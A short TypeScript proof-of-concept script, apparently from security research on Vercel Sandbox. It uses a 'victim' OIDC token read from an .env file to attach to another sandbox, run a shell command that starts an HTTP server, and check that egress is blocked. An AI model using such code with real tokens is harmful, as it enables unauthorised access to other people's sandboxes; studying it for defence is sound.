import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());
async function main() {
  const sbx = await Sandbox.get({ name: "victim-fresh", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  console.log("policy:", JSON.stringify(sbx.networkPolicy), "domain:", sbx.domain(3000));
  const res = await sbx.runCommand("bash", ["-c", `
set +e
python3 -m http.server 3000 --bind 0.0.0.0 >/tmp/srv.log 2>&1 &
sleep 1
ss -ltnp 2>/dev/null | grep -c 3000
# confirm egress denied
timeout 3 curl -s -o /dev/null -w "egress=%{http_code}\\n" --max-time 2 https://example.com 2>&1 | tail -1
echo "sandbox alive"
`], { wait: true, timeout: 30_000 });
  console.log(await res.output("both"));
  console.log("KEEP_ALIVE_MARKER=sb-5kbqg91rihu3.vercel.run");
  await new Promise(r => setTimeout(r, 1000));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
